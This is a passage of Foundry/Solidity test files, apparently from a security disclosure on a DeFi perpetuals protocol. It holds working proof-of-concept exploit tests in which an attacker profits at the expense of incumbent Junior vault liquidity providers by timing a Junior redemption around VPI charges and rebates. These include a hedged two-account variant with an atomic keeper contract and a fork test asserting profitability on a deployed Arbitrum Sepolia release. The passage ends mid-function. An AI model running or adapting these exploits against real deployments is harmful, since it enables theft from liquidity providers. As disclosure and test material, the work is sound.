        settlementToken.approve(address(juniorVault), ATTACKER_JUNIOR_ASSETS);
        uint256 requestId =
            juniorVault.requestDeposit(ATTACKER_JUNIOR_ASSETS, ATTACKER, ATTACKER);
        vm.stopPrank();

        vm.warp(juniorVault.depositEpochStart(requestId));
        _settleLpEpochThroughRouter();
        uint256 claimableAssets = juniorVault.claimableDepositRequest(requestId, ATTACKER);
        assertEq(claimableAssets, ATTACKER_JUNIOR_ASSETS, "re-entry deposit activates");
        vm.prank(ATTACKER);
        juniorVault.claimDeposit(requestId, claimableAssets, ATTACKER, ATTACKER);

        // Production cooldown begins at activation.
        vm.warp(block.timestamp + 1 hours + 10);
    }

    function _routerOpen() internal {
        vm.prank(ATTACKER);
        uint64 orderId = router.commitOrder(
            CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN, 0, false
        );
        _execute(orderId);
    }

    function _routerClose() internal {
        vm.prank(ATTACKER);
        uint64 orderId = router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
        _execute(orderId);
    }

    function _routerCloseAndMeasurePoolChange() internal returns (int256 change) {
        uint256 beforeAssets = pool.totalAssets();
        _routerClose();
        change = int256(pool.totalAssets()) - int256(beforeAssets);
    }

    function _execute(
        uint64 orderId
    ) internal {
        bytes[] memory data = _releasePriceData();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Router order executes");
    }

    function _settleLpEpochThroughRouter() internal {
        bytes[] memory data = _releasePriceData();
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _releasePriceData() internal returns (bytes[] memory updateData) {
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        uint64 confidence = uint64((PRICE * 10) / 10_000); // maximum release confidence ratio: 10 bps.
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(PRICE)),
            confidence,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(PRICE);
    }

    function _attackerWealth() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER));
    }
}

interface IAtomicEpochRouter {
    function executeOrder(uint64 orderId, bytes[] calldata updateData)
        external payable returns (OrderV3Types.ExecutionResult memory);
    function settleLpEpoch(bytes[] calldata updateData) external payable;
}

/// @dev A permissionless keeper can bundle FIFO fills and a pre-requested LP epoch in one transaction.
contract AtomicEpochTradeExecutor {
    IAtomicEpochRouter public immutable router;

    constructor(IAtomicEpochRouter router_) { router = router_; }

    function execute(uint64 firstId, uint64 secondId, bytes[] calldata tick, uint256 firstFee, uint256 epochFee, uint256 secondFee)
        external payable
    {
        require(msg.value == firstFee + epochFee + secondFee, "oracle fee funding");
        require(
            router.executeOrder{value: firstFee}(firstId, tick).status == OrderV3Types.LifecycleStatus.Executed,
            "first order"
        );
        router.settleLpEpoch{value: epochFee}(tick);
        require(
            router.executeOrder{value: secondFee}(secondId, tick).status == OrderV3Types.LifecycleStatus.Executed,
            "second order"
        );
    }

    function executePair(uint64 firstId, uint64 secondId, bytes[] calldata tick, uint256 firstFee, uint256 secondFee)
        external payable
    {
        require(msg.value == firstFee + secondFee, "oracle fee funding");
        require(
            router.executeOrder{value: firstFee}(firstId, tick).status == OrderV3Types.LifecycleStatus.Executed,
            "first order"
        );
        require(
            router.executeOrder{value: secondFee}(secondId, tick).status == OrderV3Types.LifecycleStatus.Executed,
            "second order"
        );
    }

    receive() external payable {}
}

/// @notice Two opposing trader accounts hold equal LONG and SHORT exposure at one fixed basket mark.
///         The matched control performs the same four trades without a Junior exit.
contract PositiveVpiJuniorExitBeforeRebateHedgedPairTest is BasePerpTest {
    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant VICTIM = address(0xB0B1);
    address internal constant ATTACKER = address(0xA77A);
    address internal constant KEEPER = address(0xBEEF);
    address internal constant NEUTRAL_LP = address(0xCAFE);
    address internal constant HEDGE = address(0xA77B);
    uint256 internal constant T0 = 1_794_218_400;
    uint256 internal constant PRICE = 100_000_000;
    uint256 internal constant LOT = 1e20;
    uint256 internal constant MARGIN = 30_000e6;
    uint256 internal constant TRADER_FUNDING = 100_000e6;
    uint256 internal constant NEUTRAL_WORK_ASSETS = 1e6;
    uint64 internal constant HEDGED_CONFIDENCE = 1_000;
    uint256 internal constant HEDGED_SIZE = 40_000 * LOT;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _configureReleaseRouter() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1_000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000; // 0.01 USDG.
        config.maxOpenOrderExecutionBountyAssets = 200_000; // 0.20 USDG.
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        config.minEngineGas = 600_000;
        config.maxPruneOrdersPerCall = 64;
        _setRouterConfig(config);
    }

    function _installMark(uint256 timestamp) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(_basketData(timestamp, timestamp - 1));
        assertEq(engine.lastMarkPrice(), PRICE, "public Router mark refresh");
    }

    function _fundJuniorPublic(address lp, uint256 assets) internal {
        uint256 requestId = _requestDeposit(lp, assets, true);
        uint256 activation = juniorVault.depositEpochStart(requestId);
        _settleEpochAt(activation);
        _claimDeposit(lp, requestId);
    }

    function _fundSeniorPublic(address lp, uint256 assets) internal {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(seniorVault), assets);
        uint256 requestId = seniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        uint256 activation = seniorVault.depositEpochStart(requestId);
        _settleEpochAt(activation);
        uint256 claimableAssets = seniorVault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, assets, "Senior deposit activated");
        vm.prank(lp);
        seniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _requestFullJuniorRedeem(address lp) internal returns (uint256 requestId) {
        uint256 shares = juniorVault.balanceOf(lp);
        assertGt(shares, 0, "redeemer must own Junior shares");
        vm.prank(lp);
        requestId = juniorVault.requestRedeem(shares, lp, lp);
    }

    function _claimRedeem(address lp, uint256 requestId) internal returns (uint256 assets) {
        assets = juniorVault.claimableRedeemAssets(requestId, lp);
        assertGt(assets, 0, "redemption must be funded");
        vm.prank(lp);
        juniorVault.withdraw(assets, lp, lp);
    }

    function _requestDeposit(address lp, uint256 assets, bool mintAssets) internal returns (uint256 requestId) {
        if (mintAssets) {
            settlementToken.mint(lp, assets);
        }
        assertGe(settlementToken.balanceOf(lp), assets, "depositor needs wallet assets");
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    function _claimDeposit(address lp, uint256 requestId) internal returns (uint256 shares) {
        uint256 assets = juniorVault.claimableDepositRequest(requestId, lp);
        assertGt(assets, 0, "deposit must activate");
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, assets, lp, lp);
        assertGt(shares, 0, "deposit must mint shares");
    }

    function _basketData(uint256 publishTime, uint256 previousPublishTime)
        internal pure returns (bytes[] memory)
    {
        return _basketDataWithConfidence(publishTime, previousPublishTime, 30_000);
    }

    function _basketDataWithConfidence(
        uint256 publishTime,
        uint256 previousPublishTime,
        uint64 confidence
    ) internal pure returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: ids[i],
                price: MockPyth.MockPrice({
                    price: int64(uint64(PRICE)),
                    conf: confidence,
                    expo: -8,
                    publishTime: publishTime,
                    prevPublishTime: previousPublishTime
                })
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _hedgedOrderRequest(
        address account,
        CfdTypes.Side side,
        bool close
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 nowTime = vm.getBlockTimestamp();
        request.clientOrderId = keccak256(abi.encode("hedged-positive-vpi", router.nextCommitId(), account, close));
        request.side = side;
        request.sizeDelta = HEDGED_SIZE;
        request.marginDelta = close ? 0 : MARGIN;
        request.targetPrice = side == CfdTypes.Side.LONG
            ? (close ? CAP_PRICE : 1)
            : (close ? 1 : CAP_PRICE);
        request.isClose = close;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(nowTime + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commitHedgedOrder(address account, CfdTypes.Side side, bool close) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _hedgedOrderRequest(account, side, close);
        vm.prank(account);
        orderId = router.commitOrder(request);
    }

    function _settleEpochAt(uint256 boundary) internal {
        vm.warp(boundary);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory updateData = _basketData(boundary, boundary - 1);
        vm.prank(KEEPER);
        router.settleLpEpoch(updateData);
        assertEq(engine.lastMarkPrice(), PRICE, "epoch uses neutral basket mark");
        assertEq(engine.lastMarkTime(), boundary, "epoch mark is from the current hour");
    }

    function _requestNeutralEpochWork() internal returns (uint256 requestId) {
        requestId = _requestDeposit(NEUTRAL_LP, NEUTRAL_WORK_ASSETS, true);
    }
    function _setupHedgedPairPool() internal {
        _configureReleaseRouter();
        _setSeniorCapacity(40_000_000e6, 8000);
        _installMark(T0);
        _fundJuniorPublic(VICTIM, 1_000_000e6);
        _fundJuniorPublic(ATTACKER, 5_000_000e6);
        _fundSeniorPublic(SENIOR_LP, 4_000_000e6);
        _fundTrader(ATTACKER, TRADER_FUNDING);
        _fundTrader(HEDGE, TRADER_FUNDING);
        _installMark(T0 + 4 hours);
    }

    function _hedgedAttackerAssets() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER) + clearinghouse.balanceAssets(ATTACKER)
            + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER))
            + settlementToken.balanceOf(HEDGE) + clearinghouse.balanceAssets(HEDGE);
    }

    function _runHedgedPairCycle(bool exitBeforeOppositeOpen, uint64 confidence)
        internal
        returns (int256 attackerNet, int256 victimNet, int256 treasuryNet, int256 keeperNet)
    {
        uint256 attackerBefore = _hedgedAttackerAssets();
        uint256 victimBefore = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        AtomicEpochTradeExecutor atomicKeeper = new AtomicEpochTradeExecutor(IAtomicEpochRouter(address(router)));
        uint256 boundary = T0 + 5 hours;
        vm.warp(T0 + 4 hours + 10);
        uint256 neutralRequestId = _requestNeutralEpochWork();
        uint256 redeemRequestId;
        if (exitBeforeOppositeOpen) {
            redeemRequestId = _requestFullJuniorRedeem(ATTACKER);
        }

        vm.warp(boundary - 10);
        uint64 longOpenId = _commitHedgedOrder(ATTACKER, CfdTypes.Side.LONG, false);
        uint64 shortOpenId = _commitHedgedOrder(HEDGE, CfdTypes.Side.SHORT, false);

        vm.warp(boundary + 2);
        vm.roll(vm.getBlockNumber() + 1);
        uint256 executionBlock = vm.getBlockNumber();
        bytes[] memory sharedTick = _basketDataWithConfidence(boundary + 1, boundary - 10, confidence);
        _startRecordingLogs();
        vm.prank(KEEPER);
        atomicKeeper.execute(longOpenId, shortOpenId, sharedTick, 0, 0, 0);
        OrderV3Types.OrderReceipt memory longOpen =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), longOpenId);
        assertGt(longOpen.economics.vpiAssets, 7_500e6, "first leg creates material pool VPI revenue");
        assertEq(engine.lastMarkPrice(), PRICE, "long fill installs the neutral mark");
        OrderV3Types.OrderReceipt memory shortOpen =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), shortOpenId);
        assertLt(shortOpen.economics.vpiAssets, -7_500e6, "opposing open receives pool-funded VPI rebate");
        assertEq(longOpen.neutralMarkPrice, PRICE, "first leg sees unchanged neutral price");
        assertEq(shortOpen.neutralMarkPrice, PRICE, "opposing leg sees unchanged neutral price");
        console2.log("hedged first open VPI atoms", longOpen.economics.vpiAssets);
        console2.log("hedged opposing open VPI atoms", shortOpen.economics.vpiAssets);
        console2.log("hedged opposing reserve atoms", clearinghouse.vpiRebateReserveAssets(HEDGE));
        _claimDeposit(NEUTRAL_LP, neutralRequestId);
        if (exitBeforeOppositeOpen) {
            _claimRedeem(ATTACKER, redeemRequestId);
            assertEq(juniorVault.balanceOf(ATTACKER), 0, "attacker Junior exit completes after atomic epoch pricing");
        }
        assertEq(vm.getBlockNumber(), executionBlock, "open, LP exit, and opposing open share one block");
        (uint256 longSize,,,,,,) = engine.positions(ATTACKER);
        (uint256 shortSize,,,,,,) = engine.positions(HEDGE);
        assertEq(longSize, HEDGED_SIZE, "long leg remains open");
        assertEq(shortSize, HEDGED_SIZE, "opposite leg cancels price exposure");

        vm.warp(boundary + 4);
        vm.roll(vm.getBlockNumber() + 1);
        uint64 shortCloseId = _commitHedgedOrder(HEDGE, CfdTypes.Side.SHORT, true);
        uint64 longCloseId = _commitHedgedOrder(ATTACKER, CfdTypes.Side.LONG, true);
        vm.warp(boundary + 6);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory closeTick = _basketDataWithConfidence(boundary + 5, boundary + 4, confidence);
        _startRecordingLogs();
        vm.prank(KEEPER);
        atomicKeeper.executePair(shortCloseId, longCloseId, closeTick, 0, 0);
        OrderV3Types.OrderReceipt memory shortClose =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), shortCloseId);
        OrderV3Types.OrderReceipt memory longClose =
            _verifiedReceipt(IOrderLifecycleBook(address(router.lifecycleBook())), longCloseId);
        assertEq(shortClose.neutralMarkPrice, PRICE, "opposing close sees unchanged neutral price");
        assertEq(longClose.neutralMarkPrice, PRICE, "first close sees unchanged neutral price");
        console2.log("hedged opposing close VPI atoms", shortClose.economics.vpiAssets);
        console2.log("hedged first close VPI atoms", longClose.economics.vpiAssets);
        console2.log("hedged final reserve atoms", clearinghouse.vpiRebateReserveAssets(HEDGE));
        console2.log("hedged final claims atoms", engine.totalTraderClaimBalanceAssets());

        (longSize,,,,,,) = engine.positions(ATTACKER);
        (shortSize,,,,,,) = engine.positions(HEDGE);
        assertEq(longSize + shortSize, 0, "both price legs are flat at the original mark");
        attackerNet = int256(_hedgedAttackerAssets()) - int256(attackerBefore);
        victimNet = int256(juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM))) - int256(victimBefore);
        treasuryNet = int256(clearinghouse.balanceAssets(engine.protocolTreasury())) - int256(treasuryBefore);
        keeperNet = int256(clearinghouse.balanceAssets(KEEPER) + clearinghouse.balanceAssets(address(atomicKeeper)))
            - int256(keeperBefore);
    }

    function test_HedgedOppositeAccountsCaptureVpiAcrossJuniorExitAtConstantPrice() public {
        _setupHedgedPairPool();
        uint256 branchPoint = vm.snapshotState();
        (int256 controlAttacker, int256 controlVictim, int256 controlTreasury, int256 controlKeeper) =
            _runHedgedPairCycle(false, HEDGED_CONFIDENCE);
        assertTrue(vm.revertToState(branchPoint));
        (int256 attackAttacker, int256 attackVictim, int256 attackTreasury, int256 attackKeeper) =
            _runHedgedPairCycle(true, HEDGED_CONFIDENCE);

        console2.log("hedged control attacker atoms", controlAttacker);
        console2.log("hedged attack attacker atoms", attackAttacker);
        console2.log("hedged control victim atoms", controlVictim);
        console2.log("hedged attack victim atoms", attackVictim);
        console2.log("hedged control treasury atoms", controlTreasury);
        console2.log("hedged attack treasury atoms", attackTreasury);
        console2.log("hedged control keeper atoms", controlKeeper);
        console2.log("hedged attack keeper atoms", attackKeeper);

        assertGt(attackAttacker, 0, "attacker profits after four execution fees at unchanged oracle price");
        assertGt(attackAttacker - controlAttacker, 5_000e6, "Junior exit creates the profit difference");
        assertLt(attackVictim - controlVictim, -1_000e6, "remaining Junior LP loses versus identical trades");
    }

    function test_HedgedConfidenceSensitivity_ObservedFeedScale() public {
        _setupHedgedPairPool();
        uint256 branchPoint = vm.snapshotState();
        (int256 controlAttacker, int256 controlVictim,,) = _runHedgedPairCycle(false, 1_800);
        assertTrue(vm.revertToState(branchPoint));
        (int256 attackerNet, int256 victimNet,,) = _runHedgedPairCycle(true, 1_800);
        console2.log("hedged 0.18bp confidence control attacker atoms", controlAttacker);
        console2.log("hedged 0.18bp confidence control victim atoms", controlVictim);
        console2.log("hedged 0.18bp confidence attacker atoms", attackerNet);
        console2.log("hedged 0.18bp confidence victim atoms", victimNet);
        assertGt(attackerNet, 0, "hedged extraction persists at observed low confidence");
        assertGt(attackerNet - controlAttacker, 5_000e6, "Junior exit drives sensitivity profit");
        assertLt(victimNet - controlVictim, -5_000e6, "remaining Junior funds the transfer");
    }
}
```

### PositiveVpiJuniorExitBeforeRebateFork.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";

interface IMockUSDG {

    function mint(
        address to,
        uint256 amount
    ) external;
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);

}

interface IRealPyth {

    function getPriceUnsafe(
        bytes32 id
    ) external view returns (int64 price, uint64 conf, int32 expo, uint256 publishTime);

}

/// @dev Foundry forks do not execute Arbitrum's native ArbSys precompile; the Router reads the L2 block through it.
contract ArbSysBlockNumberShim {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

/// @notice Tests a positive-VPI charge followed by a Junior redemption and a same-position rebate against
///         the deployed Arbitrum Sepolia v2.0.0 release. Protocol bytecode is untouched. Pyth and ArbSys are
///         replaced locally, with the Pyth mock using the six prices and confidences read at the fork block.
contract PositiveVpiJuniorExitBeforeRebateForkTest is Test {

    // Thu 2026-10-29 14:00 UTC. The deployed pool holds 2,000,002 USDG (1M Senior + 1M Junior + 1 USDG seeds), no
    // positions. Live FX hours, outside FAD/frozen windows for the whole test timeline.
    uint256 internal constant FORK_BLOCK = 324_032_051;

    address internal constant PYTH = address(bytes20(hex"0b73614636c855bf23f342f307fb981a3e47f42b"));
    address internal constant ARB_SYS = address(100);
    address internal constant DEPLOYER_LP = address(bytes20(hex"5a71a4094ec81165ada48aa4c27da48ec27e0d6b"));
    IMockUSDG internal constant USDG = IMockUSDG(address(bytes20(hex"3d051dbbf5ff427a4ae8ad09746902666af8fb9d")));
    MarginClearinghouse internal constant CH =
        MarginClearinghouse(address(bytes20(hex"b5b851f627d6df3cf3f096e23e20a58884d7b89a")));
    CfdEngine internal constant ENGINE = CfdEngine(address(bytes20(hex"ca18a6783d7542f9d2f28f4f259772b74c4d6baa")));
    HousePool internal constant POOL = HousePool(address(bytes20(hex"eb5604c393843b2f3c347ec24fa9ddad6ab2131e")));
    TrancheVault internal constant SENIOR =
        TrancheVault(address(bytes20(hex"5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d")));
    TrancheVault internal constant JUNIOR =
        TrancheVault(address(bytes20(hex"4a8b67184a1e3224c11a191cc69f22c50eef734e")));
    OrderRouter internal constant ROUTER = OrderRouter(address(bytes20(hex"918663d6da8cb33b325a04c4a5e8c51d42f3b444")));
    PletherOracle internal constant ORACLE =
        PletherOracle(address(bytes20(hex"4f2c62a0e03657f52c633c19c11f88d8f0897bb2")));

    address internal constant SENIOR_LP = address(0x5E110001);
    address internal constant ATTACKER = address(0xA77A0001);
    address internal constant KEEPER = address(0xCEE20001);

    uint256 internal constant LOT = 1e20;
    // The real basket is around 0.96. At 37k lots the LONG endpoint reserve still leaves enough cash to fund
    // the attacker's 6M Junior redemption under the release 25-bp settlement buffer.
    uint256 internal constant POSITION_SIZE = 37_000 * LOT;
    uint256 internal constant SENIOR_ADD = 2_000_000e6; // deployed 1M + 2M = 3M Senior
    uint256 internal constant ATTACKER_JUNIOR_ADD = 6_000_000e6; // deployed 1M + 6M = 7M Junior
    uint256 internal constant ATTACKER_TRADER_ASSETS = 100_000e6;
    uint256 internal constant ATTACK_MARGIN = 30_000e6;

    bytes32[] internal feedIds;
    int64[] internal feedPrices;
    uint64[] internal feedConfs;
    int32[] internal feedExpos;
    uint256 internal clientNonce;

    struct Outcome {
        uint256 openVpiCharge;
        int256 openReceiptVpi;
        int256 closeReceiptVpi;
        uint256 juniorNavBeforeOpen;
        uint256 juniorNavAfterOpen;
        int256 closePoolChange;
        int256 attackerDelta;
        int256 incumbentJuniorDelta;
        int256 honestSeniorDelta;
        uint256 redeemedAssets;
        uint256 treasuryDelta;
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia");
        _assertDeployedBytecode();

        // Capture the real Pyth prices/confidences the deployed oracle would read, then replace Pyth (out of scope).
        uint256 n;
        while (true) {
            try ORACLE.pythFeedIds(n) returns (bytes32 id) {
                (int64 p, uint64 c, int32 e,) = IRealPyth(PYTH).getPriceUnsafe(id);
                feedIds.push(id);
                feedPrices.push(p);
                feedConfs.push(c);
                feedExpos.push(e);
                ++n;
            } catch {
                break;
            }
        }
        assertEq(n, 6, "six-feed release basket");
        vm.etch(PYTH, address(new MockPyth()).code);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0));
        }
        MockPyth(PYTH).setFee(1);
        for (uint256 i; i < n; ++i) {
            MockPyth(PYTH).setPrice(feedIds[i], feedPrices[i], feedConfs[i], feedExpos[i], 0);
        }
        vm.etch(ARB_SYS, address(new ArbSysBlockNumberShim()).code);
        vm.deal(KEEPER, 100 ether);
    }

    function testFork_realConfidence_exitBeforeRebateVsControl() public {
        _runScenario("real six-feed confidence");
    }

    function testFork_maxReleaseConfidence_exitBeforeRebateVsControl() public {
        // Each feed approaches the release basket cap of 10 bps.
        for (uint256 i; i < feedIds.length; ++i) {
            feedConfs[i] = uint64(uint256(int256(feedPrices[i])) * 95 / 100_000);
        }
        _runScenario("9.5-bp confidence per feed");
    }

    function _runScenario(
        string memory label
    ) internal {
        console2.log("SCENARIO", label);
        _buildState();

        uint256 snap = vm.snapshotState();
        Outcome memory attack = _cycle(true);
        assertTrue(vm.revertToState(snap));
        Outcome memory control = _cycle(false);

        console2.log("positive open VPI charge", attack.openVpiCharge);
        console2.log("positive position VPI accrued", attack.openReceiptVpi);
        console2.log("projected Junior NAV before open", attack.juniorNavBeforeOpen);
        console2.log("projected Junior NAV after open", attack.juniorNavAfterOpen);
        console2.log("ATTACK close VPI", attack.closeReceiptVpi);
        console2.log("attack redeemed assets", attack.redeemedAssets);
        console2.log("ATTACK attacker delta", attack.attackerDelta);
        console2.log("ATTACK incumbent Junior delta", attack.incumbentJuniorDelta);
        console2.log("ATTACK honest Senior delta", attack.honestSeniorDelta);
        console2.log("ATTACK close pool change", attack.closePoolChange);
        console2.log("ATTACK treasury delta", attack.treasuryDelta);
        console2.log("control redeemed assets", control.redeemedAssets);
        console2.log("CONTROL attacker delta", control.attackerDelta);
        console2.log("CONTROL incumbent Junior delta", control.incumbentJuniorDelta);
        console2.log("CONTROL honest Senior delta", control.honestSeniorDelta);
        console2.log("CONTROL close pool change", control.closePoolChange);
        console2.log("CONTROL close VPI", control.closeReceiptVpi);
        console2.log("CONTROL treasury delta", control.treasuryDelta);

        assertGt(attack.openVpiCharge, 5_000e6, "material positive VPI enters pool revenue");
        assertEq(attack.openReceiptVpi, -attack.closeReceiptVpi, "exit close returns the paid positive VPI");
        assertGt(attack.attackerDelta, 0, "attack is profitable on the deployed release");
        assertLt(control.attackerDelta, 0, "same trades closed before activation only cost money");
        assertLt(attack.incumbentJuniorDelta, control.incumbentJuniorDelta, "incumbent Junior funds the gain");
        assertGt(attack.redeemedAssets, control.redeemedAssets, "redemption captures VPI-inflated NAV");
        assertApproxEqAbs(
            attack.closePoolChange, control.closePoolChange, 5e6,
            "close pool economics agree across LP timing branches"
        );
    }

    function _buildState() internal {
        _refreshMark();
        console2.log("deployed pool assets at fork", POOL.totalAssets());
        console2.log("deployed basket mark", ENGINE.lastMarkPrice());

        // The deployed LP already owns 1M Junior and 1M Senior. Add attacker Junior and honest Senior through public epochs.
        _fundTranche(JUNIOR, ATTACKER, ATTACKER_JUNIOR_ADD);
        _fundTranche(SENIOR, SENIOR_LP, SENIOR_ADD);
        console2.log("pool assets after honest LP funding", POOL.totalAssets());
        console2.log("senior principal", POOL.seniorPrincipal());
        console2.log("junior principal", POOL.juniorPrincipal());
        _fundTrader(ATTACKER, ATTACKER_TRADER_ASSETS);
        _warpTo(vm.getBlockTimestamp() + 1 hours + 2);
    }

    function _cycle(
        bool closeAfterFunding
    ) internal returns (Outcome memory out) {
        int256 attackerBefore = int256(_attackerWealth());
        int256 juniorBefore = int256(_juniorValue(DEPLOYER_LP));
        int256 seniorBefore = int256(_seniorValue(SENIOR_LP) + _seniorValue(DEPLOYER_LP));
        uint256 treasuryBefore = CH.balanceAssets(ENGINE.protocolTreasury());

        uint256 shares = JUNIOR.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = JUNIOR.requestRedeem(shares, ATTACKER, ATTACKER);
        uint256 fundingTime = redeemId * 1 hours;
        _warpTo(fundingTime - 30);
        uint256 poolBefore = POOL.totalAssets();
        (, out.juniorNavBeforeOpen) = POOL.getPendingDepositTrancheState();
        out.openReceiptVpi = _routerTrade(ATTACKER, CfdTypes.Side.LONG, POSITION_SIZE, ATTACK_MARGIN, false);
        out.openVpiCharge = POOL.totalAssets() - poolBefore;
        (,,,,,, int256 vpiAccrued) = ENGINE.positions(ATTACKER);
        assertGt(vpiAccrued, 0, "open has positive lifetime VPI");
        assertEq(vpiAccrued, out.openReceiptVpi, "receipt matches position lifetime VPI");
        (, out.juniorNavAfterOpen) = POOL.getPendingDepositTrancheState();

        if (!closeAfterFunding) {
            _warpTo(fundingTime - 2);
            (out.closePoolChange, out.closeReceiptVpi) = _closeAndMeasurePoolChange();
        }

        _warpTo(fundingTime);
        _settleLpEpoch();
        out.redeemedAssets = JUNIOR.claimableRedeemAssets(redeemId, ATTACKER);
        assertGt(out.redeemedAssets, 0, "redemption funded");
        vm.prank(ATTACKER);
        JUNIOR.withdraw(out.redeemedAssets, ATTACKER, ATTACKER);

        if (closeAfterFunding) {
            (out.closePoolChange, out.closeReceiptVpi) = _closeAndMeasurePoolChange();
        }

        (, uint256 longOi,,) = ENGINE.sides(0);
        (, uint256 shortOi,,) = ENGINE.sides(1);
        assertEq(longOi, 0, "attacker LONG fully closed");
        assertEq(shortOi, 0, "no unrelated SHORT");

        out.attackerDelta = int256(_attackerWealth()) - attackerBefore;
        out.incumbentJuniorDelta = int256(_juniorValue(DEPLOYER_LP)) - juniorBefore;
        out.honestSeniorDelta = int256(_seniorValue(SENIOR_LP) + _seniorValue(DEPLOYER_LP)) - seniorBefore;
        out.treasuryDelta = CH.balanceAssets(ENGINE.protocolTreasury()) - treasuryBefore;
    }

    function _closeAndMeasurePoolChange() internal returns (int256 change, int256 closeVpi) {
        uint256 beforeAssets = POOL.totalAssets();
        closeVpi = _routerTrade(ATTACKER, CfdTypes.Side.LONG, POSITION_SIZE, 0, true);
        change = int256(POOL.totalAssets()) - int256(beforeAssets);
    }

    // ----------------------------------------------------------------- helpers

    function _assertDeployedBytecode() internal view {
